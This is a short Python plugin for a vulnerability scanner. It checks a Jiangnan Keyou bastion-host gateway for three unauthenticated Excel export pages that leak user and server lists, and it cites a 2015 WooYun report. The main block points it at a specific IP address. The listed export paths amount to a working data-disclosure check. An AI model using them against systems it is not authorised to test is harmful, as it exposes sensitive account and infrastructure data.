#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = 江南科友堡垒机敏感信息泄漏集合3处
#__Refer___ = www.wooyun.org/bugs/wooyun-2015-0135704


def assign(service, arg):
    if service == 'hac_gateway':
        return True, arg


def audit(arg):
    payloads = ['excel/sso_user_export.php',
                'excel/user_export.php',
                'excel/server_export.php']
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 200 and '.xls' in head and 'application/vnd.ms-excel' in head:
            security_warning('江南科友堡垒机敏感信息泄漏:' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('hac_gateway', 'https://123.124.158.72/')[1])